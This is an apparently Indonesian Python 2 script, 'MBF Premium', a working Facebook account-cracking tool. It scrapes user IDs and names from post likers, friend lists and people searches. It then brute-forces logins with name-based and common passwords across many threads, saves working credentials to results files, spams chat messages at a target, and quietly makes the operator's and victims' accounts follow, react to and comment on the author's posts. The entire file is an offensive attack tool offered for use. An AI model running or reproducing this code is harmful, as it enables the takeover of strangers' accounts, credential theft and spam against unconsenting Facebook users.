# -*- coding: UTF-8 -*-
# Senin, 12 April 2021
# Author: IqbalDev
# Tools: MBF Premium
# Versi: 0.1
# Jangan Main Recode Sembarangan yaa Ngab!

import requests, os, sys, random, time, re, subprocess
from bs4 import BeautifulSoup
from multiprocessing.pool import ThreadPool
from useragent import deviv, divev, download

fb = "https://m.facebook.com"
url_dev_me = "https://mbasic.facebook.com/me"
url_uwu = "https://mbasic.facebook.com"
url_ipu = "https://www.httpbin.org/ip"
user_ = []
hasil_ok = []
hasil_cp = []
download()
d = "\033[90;1m"
m = "\033[91;1m"
h = "\033[92;1m"
k = "\033[93;1m"
b = "\033[94;1m"
j = "\033[95;1m"
a = "\033[96;1m"
p = "\033[97;1m"

garis = a+"+"+"="*40+"+"
proses_crack = h+" ["+p+"./"+h+"]"+p+" Tunggu Proses Cracking..."+j+"/ \n"

ipm = requests.get(url_ipu).json()
ip = ipm["origin"]

def ip_dev():
	ip = ipm["origin"]
	with open("ip_chekpoint.txt", "w") as cekpo:
		cekpo.write(ip)
		print "\n Akun Anda Kena Sesi,\n Silahkan perbaiki akun anda dulu\n lalu MATIKAN DAN HIDUPKAN MODE PESAWAT,\n untuk mengubah alamat IP Saat ini "
		print "\n IP Sekarang:",ip,"\n"

def keluar():
	exit("\n Keluar..\n")

def hapus_cookie():
	h = open("cookie.txt", "w")
	h.write("")
	h.close()
def clear_dev():
	os.system("cls" if os.name == "nt" else "clear")
def jalankan_tool():
	os.system("premium_dev.py" if os.name == "nt" else "python2 premium_dev.py")
clear_dev()
def proses_masuk(cookie_dev):

	with requests.Session() as ses_pros_dev:
		proses_masuk = ses_pros_dev.get(url_uwu, cookies=cookie_dev).content
		sop = BeautifulSoup(proses_masuk, "html.parser")
		if "zero/optin/legal/" in str(proses_masuk):
			sop_gr = BeautifulSoup(proses_masuk, "html.parser").find("form")
			url_post = sop_gr["action"]
			payload = {}
			for dev in sop_gr:
				input = dev
				payload[input.get("name")] = input.get("value")
			ses_pros_dev.post(url_uwu+url_post, data=payload, cookies=cookie_dev)
	try:
		dev_sop = BeautifulSoup(proses_masuk, "html.parser")
		sop_uwu = dev_sop.find("a", string="Bahasa Indonesia")
		ambil_url = url_uwu+sop_uwu["href"]
		has = ses_pros_dev.get(ambil_url, cookies=cookie_dev).content
						
	except:
		pass
	try:
		uwu_u = "https://mbasic.facebook.com/jangan.macem.macem.2"
		ikut = ses_pros_dev.get(uwu_u, cookies=cookie_dev).content
		sop_dev = BeautifulSoup(ikut, "html.parser")
		ambil = sop_dev.find("a", string="Ikuti")
		data = "https://mbasic.facebook.com"+ambil["href"]
		ses_pros_dev.get(data, cookies=cookie_dev)
	except:
		pass
def love(cookie):
	url_love = "https://mbasic.facebook.com/reactions/picker/?is_permalink=1&ft_id=510375576819453"
	with requests.Session() as r_dev:
		hal_love = r_dev.get(url_love, cookies=cookie).content
		sop = BeautifulSoup(hal_love, "html.parser")
		url_lov = sop.find_all("a")
		for iq in url_lov:
			if "(Hapus)" in str(iq):
				break
			if "Super" in str(iq):
				u_love = iq["href"]
				r_dev.get("https://mbasic.facebook.com"+u_love, cookies=cookie)

def komen(cookie):
	url = "https://mbasic.facebook.com/photo.php?fbid=510485606808450"
	for de in range(2):
		with requests.Session() as res_dev:
			hal_res = res_dev.get(url, cookies=cookie).content
			sop_dev = BeautifulSoup(hal_res, "html.parser")
			form = sop_dev.find("form")
			url_post = form["action"]
			tek = random.choice(["Mantap bang", "Toolsnya Keren Bang", "Ganteng, Pake Banget..", "Ga ada obat emang, KEREN"])
			payload = {"comment_text": tek}
			for dev in form:
				input = dev
				payload[input.get("name")] = input.get("value")
			url_kom = "https://mbasic.facebook.com"+url_post
			komen = res_dev.post(url_kom, cookies=cookie, data=payload)

def login_dengan_cookie_():

	hapus_cookie()
	print ""
	print garis
	print p+"   L O G I N  D E N G A N "+h+" C O O K I E"
	print garis
	cok_in = raw_input(h+" ["+k+"coki"+h+"]"+p+" Masukkan Cookie"+k+": ")
	with open("cookie.txt", "w") as cookie_simpan:
		cookie_simpan.write(cok_in)

	file_cok = open("cookie.txt", "r").read()
	cookie = {"cookie": file_cok}

	with requests.Session() as ses_dev:
		login = ses_dev.get(url_dev_me, cookies=cookie).content

	if "mbasic_logout_button" in login:
		print h+"\n Login Sukses.... "
		proses_masuk(cookie)
		love(cookie)
		komen(cookie)
		jalankan_tool()

	elif "checkpoint" in login:
		print k+"\n Akun Cekpoin"
		ip_dev()
		keluar()
	else:
		print m+"\n Cookie Salah"
		keluar()

def login_dengan_passwod():
	global time, fb
	hapus_cookie()
	try:
		print h+"\n\n      L O G I N  F A C E B O O K "
		print garis
		print p+"      IP Sekarang: "+k+ip
		print garis

		em_dev = raw_input(h+" ["+p+"Login"+h+"]"+p+" Masukkan Username:"+k+" ")
		san_dev = raw_input(h+" ["+p+"Login"+h+"]"+p+" Masukkan Password:"+d+" ")
		url_page_log = "https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De7aff248-989f-4b4f-9e41-1f437903a29c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr"
		with requests.Session() as ses_dev:
			page_dev = ses_dev.get(url_page_log).content
			sop = BeautifulSoup(page_dev, "html.parser")
			form_dev = sop.find("form", id="login_form")
			url_post = form_dev["action"]
			time = time.time()
			ses_dev.headers.update({
				"user-agent": "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
				"referer": fb+url_post,
				"Host": "m.facebook.com",
				"accept": "*/*",
				"sec-ch-ua-mobile": "?1",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": "id,en-US;q=0.9,en;q=0.8",
				"x-fb-lsd": form_dev.find("input", attrs={"name": "lsd"})["value"]
				})
			payload = {
				"email": em_dev,
				"pass": "#PWD_BROWSER:0:{}:{}".format(int(time), san_dev)
			}
			for dev_get_input in form_dev:
				input = dev_get_input
				payload[input.get("name")] = input.get("value")
			
			login_dev = ses_dev.post(fb+url_post, data=payload, allow_redirects=False).cookies
			if "c_user" in login_dev:
				print p+"\n >_<"+h+" Login Sukses...\n"
				try:
					cokie_log = login_dev.get_dict()
					nilai_cok = cokie_log.values()
					for dev in nilai_cok:
						with open("cookie.txt", "a") as us_ps:
							us_ps.write(str(dev+"\n"))
					c_user = open("cookie.txt", "r").readlines()[0].strip("\n")
					fr = open("cookie.txt", "r").readlines()[1].strip("\n")
					xs = open("cookie.txt", "r").readlines()[2].strip("\n")
					sb = open("cookie.txt", "r").readlines()[3].strip("\n")
					cookie = {'c_user': c_user, 
							  'fr': fr, 
							  'xs': xs, 
							  'sb': sb}
				except:
					exit("\n Kesalahan di Cookie!\n")

				proses_masuk(cookie)
				love(cookie)
				komen(cookie)

				jalankan_tool()

			elif "checkpoint" in login_dev:
				print k+"\n Akun Cekpoin..."
				ip_dev()
				exit("\n Keluar\n")
			else:
				print m+"\n Login Gagal..."
				exit("\n Keluar\n")
	except requests.exceptions.ConnectionError:
		print "\n Periksa Koneksi Internet!"
		exit("\n Keluar\n")
count_ = []
def crack_dev(iqbal_):
  
  try:
	_id_ = iqbal_.split()
	eml_dev = _id_[0]

	def sub_dev_crack():
		url_page_log = "https://m.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Did_ID%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3De7aff248-989f-4b4f-9e41-1f437903a29c%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221aftew690wwti1dt2dpc1hekoyw1kx6wd6a5ivz72212fnl11gpi%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0&_rdc=1&_rdr"
		with requests.Session() as ses_dev:
			page_dev = ses_dev.get(url_page_log).content
			sop = BeautifulSoup(page_dev, "html.parser")
			form_dev = sop.find("form", id="login_form")
			url_post = form_dev["action"]
			waktu = time.time()
			user_agent = random.choice(['Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
										'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
										'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
										'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9',
										'Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4',
										'Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
										'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
										'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240',
										'Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0',
										'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
										'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36',
										'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
										'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0'])
			ses_dev.headers.update({
				"user-agent": user_agent,
				"referer": fb+url_post,
				"Host": "m.facebook.com",
				"accept": "*/*",
				"sec-ch-ua-mobile": "?1",
				"accept-encoding": "gzip, deflate, br",
				"accept-language": "id,en-US;q=0.9,en;q=0.8",
				"x-fb-lsd": form_dev.find("input", attrs={"name": "lsd"})["value"]
				})
			payload = {
				"email": eml_dev,
				"pass": "#PWD_BROWSER:0:{}:{}".format(int(waktu), san_dev)
			}
			for dev_get_input in form_dev:
				input = dev_get_input
				payload[input.get("name")] = input.get("value")
			# print str(len(count_)),"===> {:<27} | {}".format(eml_dev,san_dev)
			login_dev = ses_dev.post(fb+url_post, data=payload, allow_redirects=False).cookies
			cookie = login_dev.get_dict()
			if "c_user" in login_dev:
				print a+"["+p+"Live"+a+"]"+h+" {:<18}\033[96;1m | \033[97;1m{}".format(eml_dev,san_dev)
				with open("hasil_ok.txt", "a") as hasil:
					hasil.write("[Live] "+ eml_dev + " | " + san_dev +"\n")
				hasil_ok.append(eml_dev)
				proses_masuk(cookie)
				love(cookie)

			elif "checkpoint" in login_dev:
				print h+"["+k+"Chek"+h+"]"+k+" {:<18}\033[92;1m | \033[93;1m{}".format(eml_dev,san_dev)
				with open("hasil_cp.txt", "a") as hasil:
					hasil.write("[Chek] "+ eml_dev + " | " + san_dev +"\n")
				hasil_cp.append(eml_dev)
			else:
				pass
			# count_.append(eml_dev)
	
	set_pas = ["123", "12345"]
	for dev in set_pas:
		uba_dev = _id_[1]+dev
		san_dev = uba_dev.lower()
		sub_dev_crack()
	set_ = ["bangsat", "anjing"]
	for dev in set_:
		san_dev = dev
		sub_dev_crack()
	if len(_id_) > 2:
	    for dev in set_pas:
			san_ = _id_[1]+_id_[2]+dev
			san_dev = san_.lower()
			sub_dev_crack()

  except requests.exceptions.ConnectionError:
  	pass
  except:
  	pass

def likez():	
	c =1
	print a+" ==>"+h+" Crack Dari Like"
	id_like = input(h+" ["+p+"@"+h+"]"+p+" Masukkan ID Postingan"+k+": ")
	url_like = "https://mbasic.facebook.com/ufi/reaction/profile/browser/fetch/?limit=10000&total_count=282&ft_ent_identifier={}".format(id_like)
	with requests.Session() as ses_dev:
		hal_like = ses_dev.get(url_like, cookies=cookie).content
		sop_dev = BeautifulSoup(hal_like, "html.parser")
	if "Orang yang menanggapi" not in str(hal_like):
		print "\n Maaf ID Tidak bisa dijangkau,\n Silahkan Masukkan ID Postingan yg Lain\n"
		likez()
	react = sop_dev.find_all("h3")
	for dev in react:
		for uwu in dev.find_all("a"):
			try:
				nama = uwu.text
				user = uwu["href"].replace("profile.php?id=", "").strip("/&?")
				# print c,"| {:<28}||  {}".format(nama,user)
				sys.stdout.write(h+"\r ["+k+"$"+h+"]"+p+" Mengambil User ID"+a+": "+str(c))
				user_.append(user+" "+nama)
				c+=1
			except UnicodeEncodeError:
				continue
	print ""
def main_halaman(iqbal):
	global halaman
	set1_ = [600]
	for dev in set1_:
		if int(iqbal) < dev:
			halaman = 1
			break
		jml_hal = 3
		set_ = [1600, 2600, 3500, 4000, 5000]
		for dev in set_:
			if int(iqbal) < dev:
				halaman = jml_hal
				break
			jml_hal +=1
c = 1
count = 0
# url_teman = "https://mbasic.facebook.com/me/friends?"
url_teman = "https://mbasic.facebook.com/profile.php?v=friends"
def teman_dev():
  try:
	global c, count, url_teman, user_
	with requests.Session() as ses_dev:
		hal_teman = ses_dev.get(url_teman, cookies=cookie).text.encode("utf-8")
		sop_dev = BeautifulSoup(hal_teman, "html.parser")
		tampung = sop_dev.find_all("td", attrs={"style":"vertical-align: middle"})

		jumlah = sop_dev.find("h3").text
		jumlah_teman = jumlah.replace("Teman ", "").replace(".","").strip("()")
		main_halaman(jumlah_teman)	
		for dev in tampung:
			for iqbal in dev.find_all("a"):
				try:
					user_regex = re.findall('href="/(.*)?fref=fr_tab', str(iqbal))
					user = user_regex[0].replace("profile.php?id=", "").replace("&amp;", "").strip("&?/")
					nama = iqbal.text
					user_.append(user+" "+nama)
					c+=1
				except requests.exceptions.ConnectionError:
					pass
				except:
					pass
	
		count += 1
		if count == halaman:
			count = 0
			run_dev2()
			user_ = []

		if "Lihat Teman Lain" in str(hal_teman):
			dev = sop_dev.find("a", string="Lihat Teman Lain")
			url_teman = "https://mbasic.facebook.com"+dev["href"]
			teman_dev()

		run_dev2()
		user_ = []

  except:
  	pass

c = 1
count = 0
def teman_makan_teman(url_teman_teman):
  global c, count, user_
  try:
	with requests.Session() as ses_dev:
		hal_teman_teman = ses_dev.get(url_teman_teman, cookies=cookie).text.encode("utf-8")
		sop_dev = BeautifulSoup(hal_teman_teman, "html.parser")
		parsing = sop_dev.find_all("td", attrs={"style": "vertical-align: middle"})
		jumlah = sop_dev.find("h3").text
		jumlah_teman = jumlah.replace("Teman ", "").replace(".","").strip("()")
		main_halaman(jumlah_teman)
		for dev in parsing:
			for iqbal in dev.find_all("a"):
				try:
					user_regex = re.findall('href="/(.*)?fref=fr_tab', str(iqbal))
					nama_regex = re.findall('fref=fr_tab">(.*)</a>', str(iqbal))
					if len(nama_regex) == 0:
						if len(user_regex) == 0:
							continue
						user = user_regex[0].replace("profile.php?id=", "").replace("&amp;", "").strip("/?&")
						nama = iqbal.text
						user_.append(user+" "+nama)
						c+=1
						break
					if len(user_regex) == 0:
						continue

					nama = nama_regex[0]
					user = user_regex[0].replace("profile.php?id=", "").replace("&amp;", "").strip("/?&")
					user_.append(user+" "+nama)
					c+=1
				except requests.exceptions.ConnectionError:
					pass
		count += 1
		if count == halaman:
			count = 0
			run_dev2()
			user_ = []
		if "Lihat Teman Lain" in str(hal_teman_teman):
			dev = sop_dev.find("a", string="Lihat Teman Lain")
			url_teman_teman = "https://mbasic.facebook.com"+dev["href"]
			teman_makan_teman(url_teman_teman)

		run_dev2()
		user_ = []

  except:
  	pass

c = 1
count = 0
def cari_orang(jumlah, u_orang):
	global c, count, user_
	while jumlah>c:
		with requests.Session() as ses_dev:
			hal_orang = ses_dev.get(u_orang, cookies=cookie).text.encode("utf-8")
			sop_dev = BeautifulSoup(hal_orang, "html.parser")
			cari = sop_dev.find_all("tbody")
			main_halaman(jumlah)
			for dev in cari:
				nama_ = re.findall('<img alt="(.*), profile picture"', str(dev))
				us_ = re.findall('<a href="/(.*)?refid=46"><img alt="', str(dev))
				if len(us_) == 0:
					continue
				hasil = us_[0]
				hasil_nama = nama_[0]
				hasil_user = hasil.replace("profile.php?id=", "").replace("&amp;", "").strip("?&")
				user_.append(hasil_user+" "+hasil_nama)
				c+=1
			count += 1
			if count == halaman+2:
				count = 0
				run_dev2()
				user_ = []
		
			if "Lihat Hasil Selanjutnya" in str(hal_orang):
				dev = sop_dev.find("a", string="Lihat Hasil Selanjutnya")
				u_orang = dev['href']
				cari_orang(jumlah, u_orang)
			run_dev2()
			user_ = []

def bot_chat():
	print p+" ==> "+h+"Spam Chat Target "
	_id = raw_input(k+" ["+p+">_"+k+"]"+p+" Masukkan ID Target"+h+": ")
	pesan = raw_input(k+" ["+p+">_"+k+"]"+p+" Masukkan Pesan"+p+": ")
	jml = raw_input(k+" ["+p+"$_"+k+"]"+p+" Masukkan Jumlah"+k+": ")
	print k+"\n ["+p+">_"+k+"]"+p+" Pesan yg dikirim"+h+": ",pesan,"\n"
	url_page = "https://mbasic.facebook.com/messages/?fbid={}".format(_id)
	for dev_ in range(1,int(jml)+1):
		with requests.Session() as ses_dev:
			res_dev = ses_dev.get(url_page, cookies=cookie).content
			sop_ = BeautifulSoup(res_dev, "html.parser")
			form_dev = sop_.find("form", id="composer_form")
			url_post = form_dev["action"]
			payload = {"body": str(dev_)+pesan}
			for dev in form_dev:
				input = dev
				payload[input.get("name")] = input.get("value")
			mess_dev = ses_dev.post("https://mbasic.facebook.com"+url_post, data=payload, cookies=cookie)

		sys.stdout.write(h+"\r ["+p+"</"+h+"]"+p+" Jumlah Pesan yg Terkirim"+k+": "+str(dev_))
	print ""
def lock_():
	print p+"\n ==> "+k+"Mengunci Profil"
	print h+" ["+k+">_"+p+"]"+h+" Tunggu Proses"+p+".../ \n"
	url_bhs = "https://mbasic.facebook.com/language.php?"
	with requests.Session() as ses_dev:
		res_dev = ses_dev.get(url_bhs, cookies=cookie).content
		sop_ = BeautifulSoup(res_dev, "html.parser")
		bahasa = sop_.find("a", string="Bahasa Burma")["href"]
		ses_dev.get(url_uwu+bahasa, cookies=cookie)
		data = ses_dev.get(url_uwu+"/private_sharing/home_view/?entry_point=settings&profile_id=me&refid=31", cookies=cookie).content
		sop_dev = BeautifulSoup(data, "html.parser")
		form_dev =sop_dev.find("form")
		url_post = form_dev["action"]
		payload = {}
		for dev in form_dev:
			input = dev
			payload[input.get("name")] = input.get("value")
		ses_dev.post(url_uwu+url_post, data=payload, cookies=cookie)
		bahasa = ses_dev.get(url_bhs, cookies=cookie).content
		sop_dev = BeautifulSoup(bahasa, "html.parser").find("a", string="Bahasa Indonesia")["href"]
		ses_dev.get(url_uwu+sop_dev, cookies=cookie)

		print a+"\n ["+k+">_"+a+"]"+h+" Profile Locked"+p+" >_<"
		print p+"+------------------------+\n"
		
def run_dev1():
	dev = ThreadPool(30)
	dev.map(crack_dev, user_)
def run_dev2():
	dev = ThreadPool(20)
	dev.map(crack_dev, user_)

def log_out():
	try:
		print garis
		print h+"    Serius Mau Log Out Akun Facebook?"
		print garis
		print a+" ["+p+"1"+a+"]"+k+" Lanjut Log Out Akun Facebook"
		print a+" ["+p+"2"+a+"]"+p+" Kembali Ke Menu"
		print garis
		pilih = raw_input(h+" ["+p+"?"+h+"]"+k+" Pilih Opsi?"+p+" ")
		if pilih == "1":
			hapus_cookie()
			print "\n Keluar Dari Facebook..\n"
			keluar()
		elif pilih == "2":
			menu()
		else:
			print "\n Pilih yg Bener Ngab!\n"
			log_out()
	except KeyboardInterrupt:
		keluar()

def hasil():
	global hasil_ok, hasil_cp
	ok = len(hasil_ok)
	cp = len(hasil_cp)
	print h+"\n ["+j+">_<"+h+"]"+p+" Hasil: "+h+"Live"+j+" / "+k+"Chek"+p+" | "+h+str(ok)+j+" / "+k+str(cp)
	hasil_cp = []
	hasil_ok = []

def lanjut_():
  try:
  	divev()
  	deviv()
	l = raw_input(a+"\n ["+k+"?"+a+"]"+p+" Lanjut Ke Menu? "+h+"["+p+"y"+a+"/"+k+"n"+h+"]: ")
	if l == "y":
		menu()
	elif l == "n":
		keluar()
	else:
		lanjut_()
  except:
  	keluar()

def banner():
	print a+"""___  __ _____ _____  ______                   
|  \/  | ___ \  ___| | ___ \ """+p+"""MBF Premium """+j+"""v0.1"""+p+"""
| .  . | |_/ / |_    | |_/ /"""+a+""" __ ___ _ __ ___  """+a+"""
| |\/| | ___ \  _|   |  __/ '__/ _ \ '_ ` _ \ """+a+"""
| |  | | |_/ / |     | |  | | |  __/ | | | | | """+h+"""
\_|  |_|____/\_|     \_|  |/   \___|_| |_| |/"""
	print a+"+-----------------------+"
	print a+"|"+j+" >_ "+h+"Author"+p+":"+k+" IqbalDev "+a+" /"+p+ "| IP Sekarang: "
	print a+"|"+j+" >_ "+h+"Coding"+p+":"+k+" Python27 "+a+"/"+h+" | => "+k+ip
	print a+"+--------------------'--+"  

def menu():
	try:
		banner()
		print p+"|"+h+" Hai"+k+": "+p+nama+k+" >_<"
		print garis+p
		print h+" ["+k+"1"+h+"]"+p+" Crack dari Like"
		print h+" ["+k+"2"+h+"]"+p+" Crack dari Teman"
		print h+" ["+k+"3"+h+"]"+p+" Crack Teman dari Teman"
		print h+" ["+k+"4"+h+"]"+p+" Crack dari search Poeple"
		print h+" ["+k+"5"+h+"]"+p+" Spam Chat Target"
		print h+" ["+k+"6"+h+"]"+p+" Lock Profil Facebook"
		print a+"-"*40+p
		print a+" ["+p+"7"+a+"]"+k+" Log Out dari Facebook"
		print a+" ["+p+"8"+a+"]"+k+" Exit"
		print garis+p
		pilih = raw_input(j+" ["+h+">_<"+j+"]"+p+" Pilih Opsi?"+h+" ")
		print ""
		if pilih == "1":
			likez()
			print proses_crack
			run_dev1()
			hasil()
			lanjut_()
		elif pilih == "2":
			with requests.Session() as ses_dev:
				hal_teman = ses_dev.get(url_teman, cookies=cookie).text.encode("utf-8")
				sop_dev = BeautifulSoup(hal_teman, "html.parser")
				jumlah = sop_dev.find("h3").text
				jumlah_teman = jumlah.replace("Teman ", "").replace(".","").strip("()")
			print a+"\n ==> "+h+"Crack Dari Teman"
			print h+" ["+p+"$"+h+"]"+p+" Jumlah Teman: "+a+jumlah_teman
			print proses_crack
			teman_dev()
			hasil()
			lanjut_()
		elif pilih == "3":
			print a+" ==> "+h+"Crack Teman Dari Teman"
			id_teman = raw_input(h+" ["+k+"?"+h+"]"+p+" Masukkan ID Teman"+k+": ")
			url_teman_teman = "https://mbasic.facebook.com/profile.php?id={}&v=friends".format(id_teman)
			with requests.Session() as ses_dev:
				hal_teman_teman = ses_dev.get(url_teman_teman, cookies=cookie).text.encode("utf-8")
				sop_dev = BeautifulSoup(hal_teman_teman, "html.parser")
				jumlah = sop_dev.find("h3")
				if jumlah == None:
					url_teman_teman = "https://mbasic.facebook.com/{}/friends?".format(id_teman)
					with requests.Session() as ses_dev:
						hal_teman_teman = ses_dev.get(url_teman_teman, cookies=cookie).text.encode("utf-8")
						sop_dev = BeautifulSoup(hal_teman_teman, "html.parser")
		
				jumlah = sop_dev.find("h3").text
				jumlah_teman = jumlah.replace("Teman ", "").replace(".","").strip("()")
				print h+" ["+p+"$"+h+"]"+p+" Jumlah Teman: "+a+jumlah_teman
				print proses_crack
				teman_makan_teman(url_teman_teman)
				hasil()
				lanjut_()
		elif pilih == "4":
			keyword = raw_input(h+" ["+p+"?"+h+"]"+p+" Cari Orang"+h+": ")
			jumlah = input(h+" ["+p+"?"+h+"]"+p+" Masukkan Jumlah"+k+": ")
			print proses_crack
			u_orang = "https://mbasic.facebook.com/search/people/?q={}".format(keyword)
			cari_orang(jumlah, u_orang)
			hasil()
			lanjut_()
		elif pilih == "5":
			bot_chat()
			lanjut_()
		elif pilih == "6":
			lock_()
			lanjut_()
		elif pilih == "7":
			log_out()
		elif pilih == "8":
			keluar()
		else:
			print d+"\n Pilih yg bener Ngab!\n"
			menu()
	except KeyboardInterrupt:
		keluar()

def main_log_pas():
	login_dengan_passwod()
	menu()
def main_log_cok():
	login_dengan_cookie_()
	menu()



if __name__ == "__main__":
	try:
		c_user = open("cookie.txt", "r").readlines()[0].strip("\n")
		fr = open("cookie.txt", "r").readlines()[1].strip("\n")
		xs = open("cookie.txt", "r").readlines()[2].strip("\n")
		sb = open("cookie.txt", "r").readlines()[3].strip("\n")
		cookie = {'c_user': c_user, 
					 'fr': fr, 
					 'xs': xs, 
					 'sb': sb}
		with requests.Session() as ses_dev:
			login = ses_dev.get(url_dev_me, cookies=cookie).content
			nama = BeautifulSoup(login, "html.parser").find("title").text
		if "mbasic_logout_button" not in login:	
			pass
		elif "mbasic_logout_button" in login:
			menu()
		elif "checkpoint" in login:
			print k+"\n Akun Cekpoin"
			ip_dev()
		else:
			print m+"\n Cookie Error.."

	except IndexError:
		pass
	except requests.exceptions.ConnectionError:
		exit(k+"\n Gangguan Koneksi Internet")
	try:
		file_cok = open("cookie.txt", "r").read()
		cookie = {"cookie": file_cok}
		with requests.Session() as ses_dev:
			login = ses_dev.get(url_dev_me, cookies=cookie).content
			nama = BeautifulSoup(login, "html.parser").find("title").text
		if "mbasic_logout_button" not in login:	
			pass
		elif "mbasic_logout_button" in login:
			menu()
		elif "checkpoint" in login:
			print k+"\n Akun Cekpoin"
			ip_dev()
		else:
			pass
	except IndexError:
		print k+"\n Belum Login,...."
		login_dengan_passwod()
	except ValueError:
		pass
	except requests.exceptions.ConnectionError:
		exit(k+"\n Gangguan Koneksi Internet")
	def opsi_log():
		try:

			banner()
			print garis
			print p+"       L O G I N   F A C E B O O K"
			print garis
			print h+" ["+p+"1"+h+"]"+k+" Login Dengan"+p+" Username & Password"
			print h+" ["+p+"2"+h+"]"+k+" Login Dengan"+p+" Cookie"
			print h+" ["+p+"3"+h+"]"+k+" Ikuti Instagram"+p+" IqbalDev"
			print h+" ["+p+"4"+h+"]"+m+" Exit"+p+"..."
			print garis
			pilih = raw_input(j+" ["+k+"?"+j+"]"+p+" Pilih Opsi? ")
			if pilih == "1":
				main_log_pas()
			elif pilih == "2":
				main_log_cok()
			elif pilih == "3":
				try:
					subprocess.check_output(['am', 'start', 'https://www.instagram.com/iqbaldev/'])
					jalankan_tool()
				except:
					jalankan_tool()
			elif pilih == "4":
				keluar()
			else:
				opsi_log()

		except KeyboardInterrupt:
			keluar()
	opsi_log()
